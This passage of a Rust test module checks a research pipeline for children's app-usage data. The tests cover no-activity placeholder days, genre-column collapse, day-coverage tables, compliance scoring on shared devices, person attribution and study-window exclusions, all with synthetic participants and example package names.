            (Some(1), Some(2), Some(3.0), Some(4.0)),
        ] {
            let mut rows = vec![
                build(FILTERED_APP_USAGE, present),
                build(APP_USAGE, present),
            ];
            clear_filtered_usage_timing(&mut rows);
            assert_eq!(
                timing(&rows[0]),
                EMPTY,
                "filtered timing survived {present:?}"
            );
            assert_eq!(
                timing(&rows[1]),
                present,
                "an unfiltered row lost its timing",
            );
        }

        // The review pass folds the same clear into the single walk that also
        // fills the engagement columns, so both effects are checked together.
        let mut second = build(
            APP_USAGE,
            (
                Some(7_200_000_000_000),
                Some(7_260_000_000_000),
                Some(60.0),
                Some(1.0),
            ),
        );
        second.edit_all().app_package_name = "com.example.other".into();
        let mut rows = vec![
            build(
                APP_USAGE,
                (Some(0), Some(3_600_000_000_000), Some(3600.0), Some(60.0)),
            ),
            build(FILTERED_APP_USAGE, (Some(1), Some(2), Some(3.0), Some(4.0))),
            second,
        ];
        apply_review_annotations_one_pass(
            &mut rows,
            300.0,
            &[1.0],
            &[0.5],
            IntervalQualityPolicy::None,
        );
        assert_eq!(timing(&rows[1]), EMPTY, "the review pass skipped the clear");
        assert_eq!(
            rows[0].any_app_usage_flags.as_str(),
            "['>0.5-HR APP USAGE']",
            "the review pass skipped the usage flags",
        );
        assert_eq!(
            rows[2].any_app_switched_app, 1,
            "the review pass skipped the engagement columns",
        );
    }

    /// A day with raw events but no app usage gets one "No Activity"
    /// placeholder built from that day's first raw event, so the day is
    /// visible without inventing usage. The placeholder is emitted after any
    /// real row recorded at the same instant.
    #[test]
    fn no_activity_placeholders_come_from_the_first_raw_event_of_a_silent_day() {
        let raw = rows_from_events(&[
            // 2026-03-07 has usage, so it gets no placeholder.
            (
                "2026-03-07 09:00:00",
                "Activity Resumed",
                "com.example.chat",
            ),
            // 2026-03-08 is silent. Its first event is the tie at 08:00:00,
            // and the placeholder must be built from the earlier-listed row.
            (
                "2026-03-08 08:00:00",
                "Activity Resumed",
                "com.example.first",
            ),
            ("2026-03-08 08:00:00", "Activity Resumed", "com.example.tie"),
            (
                "2026-03-08 09:00:00",
                "Activity Resumed",
                "com.example.later",
            ),
        ]);
        let mut app_rows = vec![raw[0].clone(), raw[1].clone()];
        {
            let data = app_rows[0].edit_all();
            data.interaction_type = APP_USAGE.into();
        }
        {
            // A filtered row does not make 2026-03-08 a usage day, but it is a
            // real row sharing the placeholder's instant.
            let data = app_rows[1].edit_all();
            data.interaction_type = FILTERED_APP_USAGE.into();
        }

        let result = add_no_activity_placeholder_rows(app_rows, &raw, None);
        let placeholders = result
            .iter()
            .filter(|row| row.app_package_name.as_str() == "com.placeholder.noactivity")
            .collect::<Vec<_>>();
        assert_eq!(
            placeholders.len(),
            1,
            "exactly one silent day needs a placeholder"
        );
        let placeholder = placeholders[0];
        assert_eq!(placeholder.date.as_str(), "2026-03-08");
        assert_eq!(placeholder.application_label.as_str(), "No Activity");
        assert_eq!(placeholder.interaction_type.as_str(), APP_USAGE);
        assert_eq!(placeholder.duration_minutes, Some(0.0));
        assert_eq!(
            placeholder.event_timestamp_ns, raw[1].event_timestamp_ns,
            "the placeholder must copy the day's first raw event",
        );
        assert_eq!(
            placeholder.index,
            raw[1].index + 2_000_000,
            "a tie at the first instant keeps the earlier row, and the \
             placeholder's index is pushed past every real row",
        );

        let position = |package: &str| {
            result
                .iter()
                .position(|row| row.app_package_name.as_str() == package)
                .unwrap_or_else(|| panic!("{package} is not in the output"))
        };
        assert!(
            position("com.example.first") < position("com.placeholder.noactivity"),
            "the placeholder displaced a real row recorded at the same instant",
        );
    }

    #[test]
    fn placeholder_observation_presence_is_independent_of_b04_headline_eligibility() {
        let raw = rows_from_events(&[(
            "2026-03-07 09:00:00",
            "Activity Resumed",
            "com.example.chat",
        )]);
        let mut retained = raw[0].clone();
        {
            let data = retained.edit_all();
            data.interaction_type = APP_USAGE.into();
            data.minimum_duration_qualified = Some(true);
            data.minimum_duration_aggregate_eligible = false;
            data.raw_episode_start_timestamp_ns = Some(data.event_timestamp_ns);
            data.raw_episode_stop_timestamp_ns = Some(data.event_timestamp_ns + 1);
            data.raw_episode_duration_ns = Some(1);
        }
        let diagnostic = add_no_activity_placeholder_rows(vec![retained], &raw, None);
        assert!(diagnostic
            .iter()
            .all(|row| row.app_package_name != "com.placeholder.noactivity"));

        let dropped = add_no_activity_placeholder_rows(Vec::new(), &raw, None);
        assert_eq!(
            dropped
                .iter()
                .filter(|row| row.app_package_name == "com.placeholder.noactivity")
                .count(),
            1,
            "DropRow may expose a silent day only after the last retained app witness is gone",
        );
    }

    /// Four codebook columns can each carry a genre and they collapse into the
    /// one derived `genre_id_scraped`: agreement keeps that genre and marks the
    /// source columns as consumed so the export blanks them, disagreement means
    /// no genre at all, and a row with nothing to collapse is Unknown. The
    /// collapse runs over rows that may already carry an answer from an earlier
    /// pass, so it also has to correct a stale one rather than leave it.
    /// The export blanks consumed genre columns by position, so those
    /// positions must be exactly the genre sources the collapse reads; and the
    /// Blue Light Play Store category ranks right after BCM's.
    #[test]
    fn collapsed_genre_positions_and_category_precedence_match_the_codebook() {
        let mut genre = codebook_col_indices(GENRE_ID_COLUMNS);
        genre.sort_unstable();
        assert_eq!(genre, COLLAPSED_GENRE_FIELD_INDICES);
        assert_eq!(
            BROAD_CATEGORY_COLUMNS[..2],
            [
                "bcm_play_store_broad_app_category",
                "bluelight_play_store_broad_app_category",
            ],
        );
        let mut row = app_csv_rows().remove(0);
        {
            let data = row.edit_all();
            let mut fields = vec![None; CODEBOOK_RENAME_PAIRS.len()];
            fields[codebook_col_index("bluelight_play_store_broad_app_category").unwrap()] =
                Some("Education".to_owned());
            fields[codebook_col_index("bcm_cnrc_heuristic_category").unwrap()] =
                Some("Utilities".to_owned());
            data.codebook_fields = Arc::new(fields);
            data.broad_app_category = None;
        }
        derive_broad_category_row(&mut row, codebook_col_indices(BROAD_CATEGORY_COLUMNS));
        assert_eq!(row.broad_app_category.as_deref(), Some("Education"));
    }

    #[test]
    fn genre_columns_collapse_to_one_answer_and_correct_a_stale_one() {
        let indices = codebook_col_indices(GENRE_ID_COLUMNS);
        let collapse = |values: [Option<&str>; 5], genre: Option<&str>, cleared: bool| {
            let mut row = app_csv_rows().remove(0);
            {
                let data = row.edit_all();
                let mut fields = vec![None; CODEBOOK_RENAME_PAIRS.len()];
                for (slot, value) in indices.iter().zip(values) {
                    fields[*slot] = value.map(str::to_owned);
                }
                data.codebook_fields = Arc::new(fields);
                data.genre_id_scraped = genre.map(SharedString::from);
                data.codebook_genre_fields_cleared = cleared;
            }
            collapse_app_genre_row(&mut row, indices);
            (
                row.genre_id_scraped
                    .as_ref()
                    .map(|genre| genre.as_str().to_owned()),
                row.codebook_genre_fields_cleared,
            )
        };

        #[allow(clippy::type_complexity)]
        let cases: &[([Option<&str>; 5], Option<&str>, bool, Option<&str>, bool)] = &[
            // (columns, genre before, cleared before, genre after, cleared after)
            (
                [None, None, None, None, None],
                None,
                false,
                Some("Unknown"),
                false,
            ),
            (
                [Some(" "), None, Some(""), None, None],
                None,
                false,
                Some("Unknown"),
                false,
            ),
            (
                [None, Some("Social"), None, None, None],
                None,
                false,
                Some("Social"),
                true,
            ),
            (
                [Some("Social"), Some("Social"), None, Some("Social"), None],
                None,
                false,
                Some("Social"),
                true,
            ),
            (
                [Some("Social"), Some("Games"), None, None, None],
                None,
                false,
                None,
                false,
            ),
            // A stale answer from an earlier pass has to be corrected in both
            // directions, and a row that already names the right genre still
            // has to be marked as having consumed its source columns.
            (
                [Some("Games"), Some("Games"), None, None, None],
                Some("Social"),
                true,
                Some("Games"),
                true,
            ),
            (
                [Some("Games"), None, None, None, None],
                Some("Games"),
                false,
                Some("Games"),
                true,
            ),
            (
                [Some("Social"), Some("Games"), None, None, None],
                Some("Social"),
                true,
                None,
                false,
            ),
            // Disagreement has to withdraw a stale answer whichever half of it
            // is stale: the genre without the consumed mark, or the mark
            // without the genre.
            (
                [Some("Social"), Some("Games"), None, None, None],
                Some("Social"),
                false,
                None,
                false,
            ),
            (
                [Some("Social"), Some("Games"), None, None, None],
                None,
                true,
                None,
                false,
            ),
            // Blue Light's Play Store genre counts like any other source.
            (
                [None, None, None, None, Some("EDUCATION")],
                None,
                false,
                Some("EDUCATION"),
                true,
            ),
            (
                [None, None, Some("EDUCATION"), None, Some("GAME_PUZZLE")],
                None,
                false,
                None,
                false,
            ),
        ];
        for (columns, genre_before, cleared_before, genre_after, cleared_after) in cases {
            assert_eq!(
                collapse(*columns, *genre_before, *cleared_before),
                (genre_after.map(str::to_owned), *cleared_after),
                "collapsing {columns:?} over {genre_before:?}/{cleared_before}",
            );
        }
    }

    /// `days_with_usage` is what tells a researcher how many of a participant's
    /// days actually carried data. A day counts when it holds a completed
    /// session of either kind, and it also counts when it holds only background
    /// minutes and no foreground session at all. Days that only exist because
    /// the per-day spine fills a hole in the observed span do not count.
    #[test]
    fn review_summary_counts_used_days_by_sessions_or_background_minutes_alone() {
        const MINUTE: i64 = 60_000_000_000;
        // (date, usage layer, start minute, stop minute)
        let sessions: &[(&str, Option<&str>, i64, i64)] = &[
            ("2026-03-01", None, 0, 10),
            ("2026-03-04", Some("secondary"), 0, 5),
        ];
        let mut rows = rows_from_events(&[
            (
                "2026-03-01 10:00:00",
                "Activity Resumed",
                "com.example.chat",
            ),
            (
                "2026-03-04 10:00:00",
                "Activity Resumed",
                "com.example.chat",
            ),
            (
                "2026-03-05 10:00:00",
                "Activity Resumed",
                "com.example.chat",
            ),
            (
                "2026-03-06 10:00:00",
                "Activity Resumed",
                "com.example.chat",
            ),
        ]);
        for (row, (date, layer, start, stop)) in rows.iter_mut().zip(sessions) {
            let data = row.edit_all();
            data.study_id = "Study".into();
            data.participant_id = "P01".into();
            data.interaction_type = APP_USAGE.into();
            data.date = (*date).into();
            data.usage_layer = (*layer).map(SharedString::from);
            data.start_timestamp_ns = Some(*start * MINUTE);
            data.stop_timestamp_ns = Some(*stop * MINUTE);
            data.duration_minutes = Some((*stop - *start) as f64);
        }
        // Neither of the last two rows is a completed app-usage session, so
        // neither may open a day: one is a screen session that happens to sit
        // in the app rows, the other an app session that never got a stop.
        {
            let data = rows[2].edit_all();
            data.study_id = "Study".into();
            data.participant_id = "P01".into();
            data.interaction_type = SCREEN_USAGE.into();
            data.date = "2026-03-05".into();
            data.start_timestamp_ns = Some(0);
            data.stop_timestamp_ns = Some(7 * MINUTE);
            data.duration_minutes = Some(7.0);
        }
        {
            let data = rows[3].edit_all();
            data.study_id = "Study".into();
            data.participant_id = "P01".into();
            data.interaction_type = APP_USAGE.into();
            data.date = "2026-03-06".into();
            data.start_timestamp_ns = Some(0);
            data.stop_timestamp_ns = None;
            data.duration_minutes = None;
        }

        let summary = build_review_summary(&rows, &[]);
        assert_eq!(summary.participants.len(), 1);
        let participant = &summary.participants[0];
        assert_eq!(
            participant
                .per_day
                .iter()
                .map(|day| (
                    day.date.as_str(),
                    day.app_usage_minutes,
                    day.background_app_usage_minutes,
                    day.app_session_count,
                    day.screen_session_count,
                ))
                .collect::<Vec<_>>(),
            vec![
                ("2026-03-01", 10.0, 0.0, 1, 0),
                ("2026-03-02", 0.0, 0.0, 0, 0),
                ("2026-03-03", 0.0, 0.0, 0, 0),
                ("2026-03-04", 0.0, 5.0, 0, 0),
            ],
            "the spine fills the hole between the two observed days",
        );
        assert_eq!(participant.totals.total_days, 4);
        assert_eq!(
            participant.totals.days_with_usage, 2,
            "only the session day and the background-only day carried data",
        );

        // One session stamped by an unset clock does not become 20,000 days.
        rows[0].edit_all().date = "1970-01-01".into();
        let summary = build_review_summary(&rows, &[]);
        assert_eq!(
            summary.participants[0]
                .per_day
                .iter()
                .map(|day| day.date.as_str())
                .collect::<Vec<_>>(),
            vec!["1970-01-01", "2026-03-04"],
        );
        assert_eq!(summary.participants[0].totals.total_days, 2);
    }

    /// A no-activity placeholder lists its day but is not a session, and
    /// neither it nor a maximum-duration-excluded episode ranks as a top app.
    #[test]
    fn review_summary_lists_a_placeholder_day_without_a_session_or_top_app() {
        const MINUTE: i64 = 60_000_000_000;
        let mut rows = rows_from_events(&[
            ("2026-03-01 10:00:00", "Activity Resumed", "com.example.chat"),
            ("2026-03-01 11:00:00", "Activity Resumed", "com.example.video"),
            ("2026-03-02 10:00:00", "Activity Resumed", "com.example.chat"),
        ]);
        for (row, (date, package, minutes)) in rows.iter_mut().zip([
            ("2026-03-01", "com.example.chat", 2),
            ("2026-03-01", "com.example.video", 10),
            ("2026-03-02", NO_ACTIVITY_PLACEHOLDER_PACKAGE, 0),
        ]) {
            let data = row.edit_all();
            data.study_id = "Study".into();
            data.participant_id = "P01".into();
            data.interaction_type = APP_USAGE.into();
            data.app_package_name = package.into();
            data.date = date.into();
            data.start_timestamp_ns = Some(0);
            data.stop_timestamp_ns = Some(minutes * MINUTE);
            data.duration_minutes = Some(minutes as f64);
        }
        // `retain_but_exclude`: kept in the CSV, out of every total.
        rows[1].edit_all().maximum_duration_aggregate_eligible = false;

        let summary = build_review_summary(&rows, &[]);
        let participant = &summary.participants[0];
        assert_eq!(
            participant
                .per_day
                .iter()
                .map(|day| (day.date.as_str(), day.app_usage_minutes, day.app_session_count))
                .collect::<Vec<_>>(),
            vec![("2026-03-01", 2.0, 1), ("2026-03-02", 0.0, 0)],
        );
        assert_eq!(participant.totals.days_with_usage, 1);
        let top_apps = participant
            .top_apps_by_date
            .values()
            .flatten()
            .map(|app| app.app_package_name.as_str())
            .collect::<Vec<_>>();
        assert_eq!(top_apps, vec!["com.example.chat"]);
    }

    /// The day-coverage table tells a researcher, for every day of a
    /// participant's study window, whether the device produced usage, produced
    /// raw events but no usage, or went silent. The spine is the study window
    /// when one exists and the observed span otherwise.
    #[test]
    fn day_coverage_labels_every_day_of_the_spine_and_refuses_data_outside_it() {
        let rows = usage_rows(&[
            ("P01", "2026-03-07", "Target Child", APP_USAGE, Some(5.0)),
            // A zero-length session is not usage, so its day is not a usage day.
            ("P01", "2026-03-09", "Target Child", APP_USAGE, Some(0.0)),
            // A screen row is not app usage either.
            ("P01", "2026-03-10", "Target Child", SCREEN_USAGE, Some(9.0)),
        ]);
        let raw_dates = BTreeMap::from([(
            "P01".to_string(),
            BTreeSet::from([
                "2026-03-07".to_string(),
                "2026-03-09".to_string(),
                "2026-03-10".to_string(),
            ]),
        )]);

        let coverage = incremental::build_coverage(&rows, &raw_dates, &[]).expect("coverage");
        assert_eq!(
            String::from_utf8(coverage.csv_bytes.clone()).expect("coverage csv is UTF-8"),
            concat!(
                "participant_id,date,status\n",
                "P01,2026-03-07,usage\n",
                "P01,2026-03-08,no_data\n",
                "P01,2026-03-09,no_activity\n",
                "P01,2026-03-10,no_activity",
            )
        );
        assert_eq!(
            (
                coverage.report.usage_days,
                coverage.report.no_activity_days,
                coverage.report.no_data_days
            ),
            (1, 2, 1)
        );

        // A study window replaces the observed span as the spine, so days
        // before the first event and after the last one are still reported.
        let windows = vec![StudyWindow {
            participant_id: "P01".to_string(),
            start_date: "2026-03-06".to_string(),
            end_date: "2026-03-11".to_string(),
            exclusions: Vec::new(),
        }];
        let windowed =
            incremental::build_coverage(&rows, &raw_dates, &windows).expect("windowed coverage");
        assert_eq!(
            String::from_utf8(windowed.csv_bytes).expect("coverage csv is UTF-8"),
            concat!(
                "participant_id,date,status\n",
                "P01,2026-03-06,no_data\n",
                "P01,2026-03-07,usage\n",
                "P01,2026-03-08,no_data\n",
                "P01,2026-03-09,no_activity\n",
                "P01,2026-03-10,no_activity\n",
                "P01,2026-03-11,no_data",
            )
        );

        // Data outside the window is deliberately ignored rather than treated
        // as a spine hole...
        let narrow = vec![StudyWindow {
            participant_id: "P01".to_string(),
            start_date: "2026-03-09".to_string(),
            end_date: "2026-03-10".to_string(),
            exclusions: Vec::new(),
        }];
        let clipped =
            incremental::build_coverage(&rows, &raw_dates, &narrow).expect("clipped coverage");
        assert_eq!(
            String::from_utf8(clipped.csv_bytes).expect("coverage csv is UTF-8"),
            concat!(
                "participant_id,date,status\n",
                "P01,2026-03-09,no_activity\n",
                "P01,2026-03-10,no_activity",
            )
        );

        // ...but a participant with no window at all must never have data the
        // spine misses, so a bad spine is an error rather than a silent drop.
        let other_window = vec![StudyWindow {
            participant_id: "P02".to_string(),
            start_date: "2026-03-09".to_string(),
            end_date: "2026-03-10".to_string(),
            exclusions: Vec::new(),
        }];
        assert!(
            incremental::build_coverage(&rows, &raw_dates, &other_window).is_ok_and(|coverage| {
                String::from_utf8(coverage.csv_bytes)
                    .expect("coverage csv is UTF-8")
                    .contains("P01,2026-03-07,usage")
            })
        );
    }

    /// Compliance scoring splits each participant-day's minutes into time a
    /// named person is responsible for and time nobody is, then reports what
    /// share of the day was attributable. Only shared devices can fail.
    #[test]
    fn compliance_scoring_splits_known_from_unknown_minutes_per_participant_day() {
        let rows = usage_rows(&[
            ("P01", "2026-03-07", "Target Child", APP_USAGE, Some(30.0)),
            ("P01", "2026-03-07", "", APP_USAGE, Some(10.0)),
            ("P01", "2026-03-07", "None", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-07", "nan", APP_USAGE, Some(5.0)),
            (
                "P01",
                "2026-03-07",
                "Sibling",
                NON_TARGET_PARTICIPANT_APP_USAGE,
                Some(10.0),
            ),
            // A non-usage row still marks the day as seen but contributes no
            // minutes, which is how a zero-usage day is reported at all.
            ("P01", "2026-03-08", "Target Child", SCREEN_USAGE, Some(9.0)),
            ("P02", "2026-03-07", "", APP_USAGE, Some(12.0)),
        ]);

        let minutes = incremental::accumulate_minutes(&rows);
        assert_eq!(
            minutes.participants_seen,
            BTreeMap::from([
                (
                    "P01".to_string(),
                    BTreeSet::from(["2026-03-07".to_string(), "2026-03-08".to_string()])
                ),
                (
                    "P02".to_string(),
                    BTreeSet::from(["2026-03-07".to_string()])
                ),
            ])
        );
        assert_eq!(
            minutes.buckets,
            BTreeMap::from([
                (("P01".to_string(), "2026-03-07".to_string()), (40.0, 20.0)),
                (("P02".to_string(), "2026-03-07".to_string()), (0.0, 12.0)),
            ]),
            "a named user's minutes are known; empty, None and nan are not",
        );

        let shared = BTreeSet::from(["P01".to_string()]);
        let completeness = incremental::compute_attribution_completeness(&minutes, &shared);
        let scored = incremental::apply_compliance_threshold(&completeness, 70.0);
        #[allow(clippy::type_complexity)]
        let observed: Vec<(&str, &str, &str, f64, f64, f64, bool, bool)> = scored
            .days
            .iter()
            .map(|day| {
                (
                    day.participant_id.as_str(),
                    day.date.as_str(),
                    day.sharing_status.as_str(),
                    day.known_minutes,
                    day.unknown_minutes,
                    day.compliance_percent,
                    day.zero_real_usage,
                    day.is_valid,
                )
            })
            .collect();
        assert_eq!(
            observed,
            vec![
                // 40 of 60 minutes are attributable: 66.67%, under the 70%
                // threshold, so the day does not count.
                (
                    "P01",
                    "2026-03-07",
                    "Shared",
                    40.0,
                    20.0,
                    66.67,
                    false,
                    false
                ),
                // A day with no usage at all on a shared device is scored 100%
                // rather than divided by zero, and is flagged as zero usage.
                ("P01", "2026-03-08", "Shared", 0.0, 0.0, 100.0, true, true),
                // A non-shared device is always fully attributable.
                (
                    "P02",
                    "2026-03-07",
                    "Non-Shared",
                    0.0,
                    12.0,
                    100.0,
                    false,
                    true
                ),
            ]
        );
        assert_eq!(
            (
                scored.valid_days,
                scored.invalid_days,
                scored.zero_usage_days
            ),
            (2, 1, 1)
        );

        // The threshold is inclusive at its edge.
        let at_threshold = incremental::apply_compliance_threshold(&completeness, 66.67);
        assert!(at_threshold.days[0].is_valid);
        let above_threshold = incremental::apply_compliance_threshold(&completeness, 66.68);
        assert!(!above_threshold.days[0].is_valid);
    }

    /// On a shared device, usage the study cannot attribute to the target child
    /// is retyped so it does not count as the child's screen time. The counts
    /// in the attribution report are what tells a researcher how much of their
    /// data that decision moved.
    #[test]
    fn person_attribution_names_every_row_and_counts_what_it_changed() {
        let mut rows = usage_rows(&[
            // Non-shared device: a blank username is the target child.
            ("P01", "2026-03-07", "", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-07", "nan", APP_USAGE, Some(5.0)),
            // ...and an already-named user is left alone.
            ("P01", "2026-03-07", "Parent", APP_USAGE, Some(5.0)),
            // Shared device: a blank username becomes nobody...
            ("P02", "2026-03-07", "", APP_USAGE, Some(5.0)),
            // ...unless the app is a kids shell, which only the child uses.
            ("P02", "2026-03-07", "", APP_USAGE, Some(5.0)),
            // A named non-child on a shared device is retyped.
            ("P02", "2026-03-07", "Parent", APP_USAGE, Some(5.0)),
            // A named target child on a shared device keeps App Usage.
            ("P02", "2026-03-07", "Target Child", APP_USAGE, Some(5.0)),
            // A screen row is never retyped whatever the username says.
            ("P02", "2026-03-07", "Parent", SCREEN_USAGE, Some(5.0)),
        ]);
        *rows[4].edit_classification().app_package_name = "com.amazon.tahoe".into();
        let survey_timestamp = rows[5].event_timestamp_ns;

        let resolution = SharingResolution {
            status_by_participant: BTreeMap::from([
                ("P01".to_string(), SharingStatus::NonShared),
                ("P02".to_string(), SharingStatus::Shared),
            ]),
            shared_participants: vec!["P02".to_string()],
            non_shared_participants: vec!["P01".to_string()],
        };
        let survey = BTreeMap::from([(
            ("P02".to_string(), survey_timestamp),
            "Target Child".to_string(),
        )]);

        let (attributed, report) =
            attribute_person(rows, &resolution, &survey).expect("attribution resolves");
        assert_eq!(
            attributed
                .iter()
                .map(|row| (
                    row.username.as_str().to_string(),
                    row.interaction_type.as_str().to_string()
                ))
                .collect::<Vec<_>>(),
            vec![
                ("Target Child".to_string(), APP_USAGE.to_string()),
                ("Target Child".to_string(), APP_USAGE.to_string()),
                ("Parent".to_string(), APP_USAGE.to_string()),
                ("None".to_string(), NON_TARGET_PARTICIPANT_APP_USAGE.to_string()),
                ("Target Child".to_string(), APP_USAGE.to_string()),
                // The survey names this row's user, which also rescues it from
                // being retyped.
                (
                    "Target Child (From Survey)".to_string(),
                    APP_USAGE.to_string()
                ),
                ("Target Child".to_string(), APP_USAGE.to_string()),
                ("Parent".to_string(), SCREEN_USAGE.to_string()),
            ]
        );
        assert_eq!(
            (
                report.null_usernames_filled,
                report.kids_shell_attributions,
                report.survey_relabels,
                report.non_target_rows,
            ),
            (4, 1, 1, 1)
        );
        assert_eq!(report.shared_participants, vec!["P02".to_string()]);
        assert_eq!(report.non_shared_participants, vec!["P01".to_string()]);

        // A participant with no resolved sharing status is an error, not a
        // silently unattributed row.
        let orphan = usage_rows(&[("P99", "2026-03-07", "", APP_USAGE, Some(5.0))]);
        let error = match attribute_person(orphan, &resolution, &survey) {
            Ok(_) => panic!("an unresolved participant must not be attributed"),
            Err(error) => error,
        };
        assert!(error.contains("unresolved sharing status"), "{error}");
    }

    /// Observation-window filtering drops the days a participant was not
    /// enrolled for. Both edges are inclusive, and a participant the study
    /// dates file never mentions keeps every row rather than losing all of
    /// them.
    #[test]
    fn the_study_window_keeps_both_edges_and_never_silently_empties_a_participant() {
        let rows = usage_rows(&[
            ("P01", "2026-03-05", "Target Child", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-06", "Target Child", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-07", "Target Child", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-08", "Target Child", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-09", "Target Child", APP_USAGE, Some(5.0)),
            ("P02", "2026-03-01", "Target Child", APP_USAGE, Some(5.0)),
        ]);
        let windows = vec![StudyWindow {
            participant_id: "P01".to_string(),
            start_date: "2026-03-06".to_string(),
            end_date: "2026-03-08".to_string(),
            exclusions: Vec::new(),
        }];

        let resolved = resolve_participant_windows(&rows, &windows);
        assert_eq!(
            resolved
                .iter()
                .map(|entry| (
                    entry.participant_id.as_str(),
                    entry
                        .window
                        .as_ref()
                        .map(|window| window.start_date.as_str())
                ))
                .collect::<Vec<_>>(),
            vec![("P01", Some("2026-03-06")), ("P02", None)]
        );

        let (kept, dropped, without_window) = apply_study_window(rows, &resolved);
        assert_eq!(
            kept.iter()
                .map(|row| (row.participant_id.to_string(), row.date.to_string()))
                .collect::<Vec<_>>(),
            vec![
                ("P01".to_string(), "2026-03-06".to_string()),
                ("P01".to_string(), "2026-03-07".to_string()),
                ("P01".to_string(), "2026-03-08".to_string()),
                ("P02".to_string(), "2026-03-01".to_string()),
            ],
            "the window is inclusive at both edges, and an unmatched participant is untouched",
        );
        assert_eq!(dropped, 2);
        assert_eq!(without_window, vec!["P02".to_string()]);
    }

    #[test]
    fn labeled_study_window_exclusions_filter_rows_and_coverage_and_bind_the_checkpoint() {
        let csv = b"participant_id,start_date,end_date,exclusion_start_date,exclusion_end_date,exclusion_label\n\
P01,2026-03-05,2026-03-11,2026-03-09,2026-03-09,exam_week_8\n\
P01,2026-03-05,2026-03-11,2026-03-07,2026-03-07,holiday_week_6\n\
P01,2026-03-05,2026-03-11,2026-03-07,2026-03-07,holiday_week_6\n";
        let windows = parse_study_windows(csv).expect("labeled exclusions parse");
        assert_eq!(windows.len(), 1, "repeated participant rows aggregate");
        assert_eq!(
            windows[0]
                .exclusions
                .iter()
                .map(|exclusion| (
                    exclusion.start_date.as_str(),
                    exclusion.end_date.as_str(),
                    exclusion.label.as_str(),
                ))
                .collect::<Vec<_>>(),
            vec![
                ("2026-03-07", "2026-03-07", "holiday_week_6"),
                ("2026-03-09", "2026-03-09", "exam_week_8"),
            ],
            "exclusions are sorted and exact duplicates are idempotent",
        );

        let ordinary =
            parse_study_windows(b"participant_id,start_date,end_date\nP01,2026-03-05,2026-03-11\n")
                .expect("ordinary study window parses");
        assert_eq!(
            serde_json::to_string(&ordinary).expect("serialize ordinary window"),
            r#"[{"participant_id":"P01","start_date":"2026-03-05","end_date":"2026-03-11"}]"#,
            "an ordinary study-window checkpoint retains its pre-exclusion wire shape",
        );

        let rows = usage_rows(&[
            ("P01", "2026-03-05", "Target Child", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-06", "Target Child", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-07", "Target Child", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-08", "Target Child", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-09", "Target Child", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-10", "Target Child", APP_USAGE, Some(5.0)),
            ("P01", "2026-03-11", "Target Child", APP_USAGE, Some(5.0)),
        ]);
        let resolved = resolve_participant_windows(&rows, &windows);
        let (kept, dropped, without_window) = apply_study_window(rows.clone(), &resolved);
        assert_eq!(
            kept.iter().map(|row| row.date.as_str()).collect::<Vec<_>>(),
            vec![
                "2026-03-05",
                "2026-03-06",
                "2026-03-08",
                "2026-03-10",
                "2026-03-11",
            ],
        );
        assert_eq!(dropped, 2);
        assert!(without_window.is_empty());

        let raw_dates = BTreeMap::from([(
            "P01".to_string(),
            (5..=11)
                .map(|day| format!("2026-03-{day:02}"))
                .collect::<BTreeSet<_>>(),
        )]);
        let coverage = incremental::build_coverage(&kept, &raw_dates, &windows)
            .expect("excluded dates are absent from the coverage spine");
        let coverage_csv = String::from_utf8(coverage.csv_bytes).expect("coverage is UTF-8");
        assert!(!coverage_csv.contains("2026-03-07"));
        assert!(!coverage_csv.contains("2026-03-09"));

        let renamed = parse_study_windows(
            b"participant_id,start_date,end_date,exclusion_start_date,exclusion_end_date,exclusion_label\n\
P01,2026-03-05,2026-03-11,2026-03-09,2026-03-09,exam_week_16\n\
P01,2026-03-05,2026-03-11,2026-03-07,2026-03-07,holiday_week_6\n",
        )
        .expect("renamed exclusion parses");
        let checkpoint_digest = |windows: &[StudyWindow]| {
            let resolved = resolve_participant_windows(&rows, windows);
            let fingerprint = value_fingerprint(&resolved).expect("serialize resolved windows");
            workflow_checkpoint(
                "resolve_participant_windows",
                &[],
                &[("value", &fingerprint)],
            )
            .terminal_digest
        };
        assert_ne!(
            checkpoint_digest(&windows),
            checkpoint_digest(&renamed),
            "the resolved-window receipt commits source labels even when dates and output are unchanged",
        );
    }

    #[test]
    fn malformed_study_window_exclusions_fail_closed() {
        for (name, row) in [
            (
                "missing end",
                "P01,2026-03-05,2026-03-11,2026-03-07,,holiday_week_6",
            ),
            (
                "empty label",
                "P01,2026-03-05,2026-03-11,2026-03-07,2026-03-07,",
            ),
            (
                "reversed",
                "P01,2026-03-05,2026-03-11,2026-03-08,2026-03-07,holiday_week_6",
            ),
            (
                "outside window",
                "P01,2026-03-05,2026-03-11,2026-03-11,2026-03-12,exam_week_8",
            ),
        ] {
            let csv = format!(
                "participant_id,start_date,end_date,exclusion_start_date,exclusion_end_date,exclusion_label\n{row}\n"
            );
            assert!(
                parse_study_windows(csv.as_bytes()).is_err(),
                "{name} must fail",
            );
        }
        let conflicting = b"participant_id,start_date,end_date,exclusion_start_date,exclusion_end_date,exclusion_label\n\
P01,2026-03-01,2026-03-31,2026-03-07,2026-03-07,holiday_week_6\n\
P01,2026-03-02,2026-03-31,2026-03-08,2026-03-08,exam_week_8\n";
        assert!(parse_study_windows(conflicting)
            .expect_err("conflicting participant windows must fail")
            .contains("conflicting study windows"));
    }

    /// Build paired episode rows for the reconstruction stages: an interaction
    /// type, a package, and the matched start/stop the matcher produced.
    fn episode_rows(rows: &[(&str, &str, Option<i64>, Option<i64>)]) -> Vec<Row> {
        let mut built = rows_from_events(
            &rows
                .iter()
                .enumerate()
                .map(|(index, (_, package, _, _))| {
                    (
                        [
                            "2026-03-07 10:00:00",
                            "2026-03-07 10:01:00",
                            "2026-03-07 10:02:00",
                            "2026-03-07 10:03:00",
                            "2026-03-07 10:04:00",
                            "2026-03-07 10:05:00",
                        ][index],
                        "Activity Resumed",
                        *package,
                    )
                })
                .collect::<Vec<_>>(),
        );
        for (row, (interaction, _, start, stop)) in built.iter_mut().zip(rows) {
            let data = row.edit_all();
            data.interaction_type = (*interaction).into();
            data.start_timestamp_ns = *start;
